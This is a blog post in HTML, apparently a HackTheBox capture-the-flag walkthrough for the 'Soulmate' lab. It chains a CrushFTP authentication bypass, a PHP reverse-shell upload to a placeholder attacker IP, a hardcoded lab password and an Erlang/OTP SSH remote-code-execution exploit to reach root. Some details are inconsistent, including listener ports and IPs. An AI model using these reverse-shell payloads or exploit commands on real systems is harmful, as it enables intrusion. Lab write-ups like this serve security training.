@@ -1,0 +1,553 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Soulmate Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Soulmate Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/"},"headline":"HackTheBox Soulmate Walkthrough","datePublished":"2025-09-11T23:23+05:30","dateModified":"2026-09-30T18:27+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg","height":300,"width":300},"description":"Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Soulmate Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-lg.jpg 1366w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xl.jpg 1600w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-2xl.jpg 1920w" sizes="88vw" loading="eager" height="300" width="300" alt=""></div></figure></div><div class="entry-wrapper content__entry"><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox</p><p>HackTheBox — Soulmate Writeup</p><p><strong>Difficulty:</strong> Easy <strong>OS:</strong> Linux<br><strong>IP:</strong> 10.10.11.85<br><strong>CVEs Exploited:</strong> CVE-2025-31161 · CVE-2025-32433</p><hr><h2 id="synopsis">Synopsis</h2><p>Soulmate is an Easy-rated Linux machine that chains two CVEs to achieve full root compromise. The attack path involves:</p><ol><li>Discovering a <strong>CrushFTP</strong> instance via vhost enumeration</li><li>Exploiting <strong>CVE-2025-31161</strong> (CrushFTP auth bypass) to create a rogue admin account</li><li>Resetting <code>ben</code>‘s password, logging into the FTP share, and uploading a PHP reverse shell to the web root</li><li>Escalating to root via <strong>CVE-2025-32433</strong> (Erlang/OTP SSH RCE) on a locally-bound SSH service</li></ol><hr><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><pre><code class="language-bash">nmap -sV -sV -v -p- 10.10.11.85
+</code></pre><pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://soulmate.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Port 80 redirects to <code>http://soulmate.htb</code> — add the entry to <code>/etc/hosts</code>:</p><pre><code>10.10.11.85  soulmate.htb
+</code></pre><h3 id="directory-listing">Directory listing</h3><pre><code>dirsearch -u http://soulmate.htb           
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Target: http://soulmate.htb/
+
+[16:42:53] Starting: 
+[16:43:40] 403 -  564B  - /assets/                                          
+[16:43:40] 301 -  178B  - /assets  -&gt;  http://soulmate.htb/assets/          
+[16:43:56] 302 -    0B  - /dashboard.php  -&gt;  /login                        
+[16:44:21] 200 -    8KB - /login.php                                        
+[16:44:22] 302 -    0B  - /logout.php  -&gt;  login.php                        
+[16:44:46] 302 -    0B  - /profile.php  -&gt;  /login                          
+[16:44:50] 200 -   11KB - /register.php                                     
+  
+Task Completed  
+</code></pre><p>The web app is a dating site with <code>/register.php</code> and <code>/login.php</code>. There is a image uploads functionality. and filter <code>png,jpg,gif</code>. tryed with file uplaod vulnerablity. It’s mostly a dead end, so we move on to vhost enumeration.</p><h3 id="virtual-host-discovery">Virtual Host Discovery</h3><pre><code class="language-bash">ffuf -w /home/kali/Desktop/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://soulmate.htb&quot; -H &quot;Host : FUZZ.soulmate.htb&quot; -fs 154
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://soulmate.htb
+ :: Wordlist         : FUZZ: /home/kali/Desktop/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.soulmate.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 154
+________________________________________________
+
+ftp                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 157ms]
+:: Progress: [4989/4989] :: 99 req/sec :: Duration: [0:00:13] :: Error: 0 ::
+</code></pre><p><strong>Found:</strong> <code>ftp.soulmate.htb</code> → Update <code>/etc/hosts</code>:</p><pre><code>10.10.11.85  soulmate.htb ftp.soulmate.htb
+</code></pre><p>Navigating to <code>http://ftp.soulmate.htb</code> reveals a <strong>CrushFTP</strong> login page. It reveals version of it. Checking browser DevTools network requests shows JS files versioned <code>11.W.657-2025_03_08_07_52</code>, confirming this is <strong>CrushFTP 11</strong> built in March 2025.</p><hr><h2 id="foothold--cve-2025-31161-crushftp-auth-bypass">Foothold — CVE-2025-31161 (CrushFTP Auth Bypass)</h2><p>CrushFTP 11 (pre-patch, March 2025) is vulnerable to an authentication bypass that allows creation of arbitrary admin accounts without valid credentials.</p><p><strong>PoC:</strong> <a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">https://github.com/Immersive-Labs-Sec/CVE-2025-31161</a></p><p>Since CrushFTP runs as a vhost, patch the exploit to set the correct <code>Host</code> header:</p><pre><code class="language-python">headers = {
+    &quot;Host&quot;: &quot;ftp.soulmate.htb&quot;,
+    &quot;Cookie&quot;: &quot;currentAuth=31If; CrushAuth=...&quot;,
+    &quot;Authorization&quot;: &quot;AWS4-HMAC-SHA256 Credential=crushadmin/&quot;,
+    ...
+}
+</code></pre><p>Run the exploit:</p><pre><code class="language-bash">python3 CVE-2025-31161.py \
+    --target_host 10.10.11.85 \
+    --port 80 \
+    --new_user attacker \
+    --password &#39;attacker123!&#39;
+</code></pre><pre><code>[+] User created successfully!
+[*] Username: attacker
+[*] Password: attacker123!
+</code></pre><p>Log in as the newly created admin account. Under <strong>Admin → User Manager</strong>, we see a list of users including <code>ben</code>. Click on <code>ben</code> → <strong>Generate Random Password</strong> → <strong>Save</strong>.</p><p>Now log back in as <code>ben</code> with the newly set password.</p><hr><h2 id="php-webshell-upload-→-rce">PHP Webshell Upload → RCE</h2><p>As <code>ben</code>, an FTP share called <code>webProd</code> is accessible — it maps directly to the <code>soulmate.htb</code> web root (contains <code>index.php</code>, <code>login.php</code>, <code>dashboard.php</code>, etc.).</p><p>Create a PHP reverse shell:</p><pre><code class="language-php">&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_IP/12345 0&gt;&amp;1&#39;&quot;); ?&gt;
+</code></pre><p>Upload <code>shell.php</code> via the CrushFTP web interface into the <code>webProd</code> folder.</p><p>Start a listener and trigger it:</p><pre><code class="language-bash">nc -lvnp 9090
+curl http://soulmate.htb/shell.php
+</code></pre><pre><code>rlwrap nc -lvnp 12345  
+listening on [any] 12345 ...
+connect to [10.10.16.37] from (UNKNOWN) [10.10.11.86] 35264
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ 
+</code></pre><p>We have a shell as <code>www-data</code>.</p><hr><h2 id="lateral-movement--www-data-→-ben">Lateral Movement — www-data → ben</h2><p>During enumeration, inspect the Erlang login scripts:</p><pre><code class="language-bash">cat /usr/local/lib/erlang_login/start.escript
+</code></pre><p>Inside, the Erlang SSH OTP daemon configuration reveals hardcoded credentials:</p><pre><code class="language-erlang">{user_passwords, [{&quot;ben&quot;, &quot;HouseH0ldings998&quot;}]}
+</code></pre><p>SSH in as <code>ben</code>:</p><pre><code class="language-bash">ssh ben@soulmate.htb
+# Password: HouseH0ldings998
+</code></pre><p>Grab the user flag:</p><pre><code class="language-bash">cat ~/user.txt
+</code></pre><hr><h2 id="privilege-escalation--cve-2025-32433-erlangotp-ssh-rce">Privilege Escalation — CVE-2025-32433 (Erlang/OTP SSH RCE)</h2><h3 id="enumeration-1">Enumeration</h3><pre><code class="language-bash">ss -tlnp
+</code></pre><pre><code>LISTEN  127.0.0.1:2222   (Erlang SSH OTP daemon)
+</code></pre><h3 id="identifying-the-version">Identifying the Version</h3><p>Forward the port locally:</p><pre><code class="language-bash">ssh -L 2222:127.0.0.1:2222 -N ben@soulmate.htb
+</code></pre><p>Scan with nmap:</p><pre><code class="language-bash">nmap -p 2222 -sV -sC 127.0.0.1
+</code></pre><pre><code>2222/tcp open  ssh  SSH-2.0-Erlang/5.2.9
+</code></pre><p><strong>Erlang/OTP SSH version 5.2.9</strong> is vulnerable to <strong>CVE-2025-32433</strong>, a pre-authentication remote command execution flaw.</p><h3 id="exploitation">Exploitation</h3><p>Download a public PoC for CVE-2025-32433, start a listener, and execute:</p><pre><code class="language-bash">nc -lvnp 9090
+
+python3 exploit.py \
+    --target 127.0.0.1 \
+    --port 2222 \
+    --command &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_IP/9090 0&gt;&amp;1&#39;&quot;
+</code></pre><pre><code>[+] Received banner: SSH-2.0-Erlang/5.2.9
+[✓] Exploit sent! Command executed.
+</code></pre><pre><code>root@soulmate:/# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Grab the root flag:</p><pre><code class="language-bash">cat /root/root.txt
+</code></pre><hr><h2 id="attack-chain-summary">Attack Chain Summary</h2><pre><code>[Recon] nmap → ports 22, 80
+    ↓
+[vhost enum] ffuf → ftp.soulmate.htb (CrushFTP 11)
+    ↓
+[CVE-2025-31161] Auth bypass → rogue admin account
+    ↓
+[User Manager] Reset ben&#39;s password → access webProd share
+    ↓
+[RCE] Upload PHP shell → www-data shell
+    ↓
+[Creds] Hardcoded password in Erlang script → SSH as ben → user.txt
+    ↓
+[CVE-2025-32433] Erlang/OTP SSH 5.2.9 RCE → root shell → root.txt
+</code></pre><hr><h2 id="key-takeaways">Key Takeaways</h2><ul><li><strong>Vhost enumeration</strong> is critical — the real attack surface was hidden behind a subdomain</li><li><strong>CrushFTP</strong> had a severe auth bypass (CVE-2025-31161) allowing full admin access without credentials</li><li><strong>Hardcoded passwords</strong> in application scripts are a common way to pivot between users</li><li><strong>Erlang/OTP</strong> SSH servers are uncommon in CTFs but carry real critical CVEs — always fingerprint SSH banners</li><li>Assumed breach credentials (<code>jenna</code>) provided an entry point for reconnaissance, but the actual exploit chain didn’t require them</li></ul><hr><h2 id="tools--references">Tools &amp; References</h2><table><thead><tr><th>Tool / CVE</th><th>Purpose</th></tr></thead><tbody><tr><td><code>nmap</code></td><td>Port &amp; service enumeration</td></tr><tr><td><code>ffuf</code></td><td>Virtual host discovery</td></tr><tr><td>CVE-2025-31161</td><td>CrushFTP 11 auth bypass → admin account creation</td></tr><tr><td>CrushFTP Web UI</td><td>Password reset, file upload</td></tr><tr><td><code>nc</code> / bash reverse shell</td><td>RCE via PHP webshell</td></tr><tr><td>CVE-2025-32433</td><td>Erlang/OTP SSH 5.2.9 pre-auth RCE</td></tr><tr><td><code>ssh -L</code></td><td>Local port forwarding</td></tr></tbody></table><hr><p><em>Happy hacking!</em></p></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/crushftp/">crushftp</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2025-32433/">cve-2025-32433</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/erlangotp-ssh-rce/">erlang/otp ssh rce</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nmap/">Nmap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/soulmatehtb/">soulmate.htb</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-soulmate-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Soulmate%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-soulmate-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Soulmate%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-soulmate-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/bloodhound-ce-in-kali-linux/" class="content__nav-link" rel="prev"><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/26/responsive/bloodhound-xs.png" class="lazyload" loading="lazy" alt="" height="554" width="554"></figure><div><span>Previous</span> Bloodhound CE in kali linux</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Expressway Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/17/cheese.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="447" width="447" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-07-27T16:00" class="feed__date">July 27, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-cheese-walkthrough/">Tryhackme Cheese Walkthrough</a></h3></header><p>This is a write-up for the CheeseCTF Medium room on TryHackMe, which involves exploiting a vulnerable web application to escalate&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
